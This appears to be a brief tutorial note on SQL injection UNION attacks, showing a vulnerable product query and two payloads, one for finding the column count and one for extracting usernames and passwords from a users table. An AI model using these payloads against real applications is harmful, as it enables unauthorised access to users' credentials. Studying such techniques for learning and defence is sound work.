A **SQL injection UNION attack** lets you retrieve data from other database tables by appending extra `SELECT` queries to the original vulnerable query using `UNION`.
Example:
Vulnerable query:
```sql
SELECT name, price FROM products WHERE category = 'Gifts'
```

### Attack

1. find column count:
	`UNION SELECT NULL, NULL--` (works two columns)
2. Steal user credentials:
	`UNION SELECT username,password FROM users--`

**Result:** Appends usernames/passwords to the product listing in the page.